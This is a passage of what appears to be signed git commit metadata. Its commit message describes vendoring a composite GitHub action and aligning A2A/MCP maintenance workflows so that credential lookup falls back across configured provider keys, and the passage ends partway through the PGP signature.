working:\nFuzeFront#783/#784/#786 went red -> green once #782 merged.\n\nVendor that composite action (.github/actions/llm-endpoint) and re-stamp a2a-maintain.yml mcp-maintain.yml\nto the same pattern here, so this repo''s declared A2A/MCP surface can be\nmaintained off LITELLM_FUZE_KEY OR any configured provider key, and both the\npreflight AND each maintainer job''s own credential resolution route through the\nsame chain (not preflight alone).\n\nCo-authored-by: Claude <noreply@anthropic.com>","reason":"valid","signature":"-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqitNoCRC1aQ7uu5UhlAAAFnYQAKg1cOr4goGcjoz1CRGALBW8\nExoSKHyAM+okaNy+MwuyleFnTw9+RDp6y0Up4iaP1d1FfH+oWiqDrfbHa3eiXy8A\nrvk9naXG9uXqiusMkZNnk/5bOV4VYP60qV6NZ9ur4Rsdnj5Mfl6x6XKAYwVJ7MMG\nN5TRdW4kY00uEMpTRsv36TAf9+92wKcXwOlWRBMilDkH9